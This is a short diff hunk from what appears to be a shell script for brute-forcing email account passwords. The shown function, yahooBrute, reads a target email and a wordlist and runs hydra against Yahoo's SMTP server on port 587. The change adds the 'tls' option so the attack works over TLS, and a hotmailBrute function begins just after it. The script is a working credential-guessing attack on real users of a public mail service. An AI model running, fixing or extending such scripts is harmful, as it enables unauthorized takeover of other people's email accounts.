@@ -61,7 +61,7 @@ yahooBrute() {
 	read -p "[*] Email: " email
 	read -p "[*] Wordlist: " wordlist
 
-	hydra -l $email -P $wordlist -s 587 smtp.mail.yahoo.com smtp
+	hydra -l $email -P $wordlist -s 587 smtp.mail.yahoo.com smtp tls
 }
 
 hotmailBrute() {
